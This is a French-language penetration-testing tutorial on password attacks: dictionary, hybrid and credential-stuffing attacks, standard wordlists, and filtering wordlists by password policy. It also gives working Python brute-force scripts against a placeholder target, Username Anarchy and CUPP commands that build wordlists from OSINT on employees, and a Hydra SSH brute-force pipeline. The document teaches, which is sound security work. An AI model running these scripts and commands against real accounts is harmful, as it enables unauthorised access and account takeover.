# Types d'attaques et wordlists

## Pourquoi

Avant de lancer un outil de brute force, il faut choisir la bonne strategie. Un brute force aveugle sur un mot de passe complexe prendrait des annees. Les attaques par dictionnaire, les attaques hybrides et le credential stuffing exploitent des faiblesses humaines (mots de passe previsibles, reutilisation) pour reduire drastiquement l'espace de recherche.

## Comment ca marche

### Attaque par dictionnaire

Au lieu de tester toutes les combinaisons possibles, on utilise une liste de mots de passe connus ou probables. Ces listes proviennent de fuites de donnees, de patterns courants, ou de compilations communautaires.

La difference de performance est colossale : un brute force simple sur 8 caracteres alphanumeriques represente plus de 200 milliards de combinaisons, alors qu'une bonne wordlist contient quelques millions d'entrees au maximum.

### Attaque hybride

L'attaque hybride part d'une wordlist et applique des mutations systematiques a chaque entree :

| Pattern | Exemple de base | Resultat |
|---|---|---|
| Ajout de chiffres | `password` | `password1`, `password123` |
| Majuscule initiale | `summer` | `Summer` |
| Substitutions leet | `admin` | `@dm1n` |
| Ajout d'annee | `company` | `company2024` |
| Caractere special final | `welcome` | `welcome!`, `welcome#` |

Cette approche est efficace parce que les utilisateurs appliquent exactement ces transformations pour respecter les politiques de complexite.

### Credential stuffing

Le credential stuffing exploite la reutilisation de mots de passe entre services. Quand une base de donnees fuite (LinkedIn, Adobe, etc.), les paires `email:password` sont testees sur d'autres plateformes. Ce n'est pas du brute force au sens strict, c'est de la reutilisation de credentials connues.

## En pratique

### Wordlists essentielles

| Wordlist | Contenu | Taille | Usage |
|---|---|---|---|
| `rockyou.txt` | Mots de passe fuites de RockYou (2009) | ~14 millions | Wordlist generique la plus utilisee |
| `top-usernames-shortlist.txt` | 17 noms d'utilisateur courants | 17 entrees | Enumeration rapide de logins |
| `2023-200_most_used_passwords.txt` | 200 mots de passe les plus utilises en 2023 | 200 entrees | Test rapide avant brute force complet |
| `xato-net-10-million-passwords.txt` | Compilation de 10 millions de mots de passe | ~10 millions | Brute force large |

{% hint style="info" %}
Sur Exegol, les wordlists SecLists sont disponibles dans `/usr/share/seclists/`. Sur Kali, c'est le meme chemin. `rockyou.txt` se trouve dans `/usr/share/wordlists/`.
{% endhint %}

### Filtrer une wordlist par politique de mot de passe

Si on connait la politique de mots de passe de la cible (minimum 8 caracteres, au moins une majuscule et un chiffre), on peut filtrer la wordlist pour ne garder que les entrees conformes :

```bash
# Garder uniquement les mots de passe de 8+ caracteres avec au moins une majuscule et un chiffre
grep -E '^.{8,}$' rockyou.txt | grep '[A-Z]' | grep '[0-9]' > filtered.txt
```

Ce filtrage reduit considerablement la taille de la wordlist et evite de tester des candidats qui seraient refuses par la politique.

### Brute force d'un PIN a 4 chiffres (Python)

Pour illustrer le brute force simple, voici un script qui teste tous les PINs de 0000 a 9999 contre une API :

```python
import requests

ip = "<IP_CIBLE>"
port = 1234

for pin in range(10000):
    formatted_pin = f"{pin:04d}"
    response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")
    if response.ok and 'flag' in response.json():
        print(f"PIN trouve : {formatted_pin}")
        break
```

Un PIN a 4 chiffres ne represente que 10 000 combinaisons. Le script les parcourt en quelques secondes.

### Attaque par dictionnaire avec Python

Le meme principe applique avec une wordlist :

```python
import requests

ip = "<IP_CIBLE>"
port = 1234

with open("rockyou.txt", "r", encoding="latin-1") as f:
    for line in f:
        password = line.strip()
        response = requests.get(f"http://{ip}:{port}/login?password={password}")
        if response.ok and 'success' in response.json():
            print(f"Mot de passe trouve : {password}")
            break
```

## Wordlists personnalisees

### Username Anarchy

Username Anarchy genere des variantes de noms d'utilisateur a partir de noms complets. Utile quand on connait les noms des employes d'une organisation (via LinkedIn, site web, etc.).

```bash
# Installation
git clone https://github.com/urbanadventurer/username-anarchy.git

# Generer des variantes pour un nom
./username-anarchy Jean Dupont
# jean
# jean.dupont
# jdupont
# j.dupont
# dupont.jean
# etc.

# Depuis un fichier de noms (un par ligne, format "Prenom Nom")
./username-anarchy --input-file employes.txt > usernames.txt
```

### CUPP (Common User Passwords Profiler)

CUPP genere des wordlists personnalisees basees sur des informations personnelles de la cible : prenom, nom, date de naissance, nom du conjoint, animal de compagnie, etc.

```bash
# Installation
git clone https://github.com/Mebus/cupp.git

# Mode interactif - repondre aux questions sur la cible
python3 cupp.py -i
```

{% hint style="success" %}
CUPP est particulierement efficace contre des cibles dont on a collecte des informations via OSINT. Les gens utilisent souvent des mots de passe bases sur des elements personnels.
{% endhint %}

### Pipeline complet : OSINT vers brute force

```bash
# 1. Generer les noms d'utilisateur a partir des employes identifies
./username-anarchy --input-file employes.txt > users.txt

# 2. Generer une wordlist ciblee avec CUPP
python3 cupp.py -i  # repondre aux questions

# 3. Filtrer par la politique de mots de passe connue
grep -E '^.{8,}$' cupp_output.txt | grep '[A-Z]' | grep '[0-9]' > passwords_filtered.txt

# 4. Lancer le brute force avec Hydra
hydra -L users.txt -P passwords_filtered.txt <IP_CIBLE> ssh
```

## Pieges et galeres

- `rockyou.txt` est encode en Latin-1, pas en UTF-8. Certains outils peuvent planter si l'encodage n'est pas specifie.
- Les wordlists enormes (10M+ entrees) sont rarement necessaires. Commencer par les 200 mots de passe les plus courants, puis elargir si besoin.
- Les mutations hybrides peuvent exploser la taille de la wordlist. Hashcat et John the Ripper integrent des regles de mutation natives plus efficaces qu'un script maison.
- Le credential stuffing necessite des paires `user:password`, pas juste une liste de mots de passe. Le format est different.
- CUPP genere des listes relativement courtes (quelques milliers d'entrees). C'est un complement, pas un remplacement de rockyou.

## Retour terrain

En engagement, la strategie la plus efficace est souvent progressive : d'abord les credentials par defaut, puis les 200 mots de passe les plus courants, puis une wordlist ciblee (CUPP, OSINT), et enfin rockyou.txt en dernier recours. Chaque etape est rapide et permet de couvrir les cas les plus probables en premier.

Le filtrage par politique de mot de passe est un gain de temps enorme. Si la politique exige 10 caracteres minimum avec des chiffres, inutile de tester `password` ou `admin`.

## Memo express

| Outil / Technique | Usage |
|---|---|
| rockyou.txt | Wordlist generique, ~14M entrees |
| SecLists | Collection de wordlists (users, passwords, web) |
| `grep -E` | Filtrer une wordlist par politique |
| Username Anarchy | Generer des variantes de noms d'utilisateur |
| CUPP | Wordlist personnalisee a partir d'OSINT |
| Attaque hybride | Dictionnaire + mutations (chiffres, majuscules, leet) |
| Credential stuffing | Paires fuitees testees sur d'autres services |

***
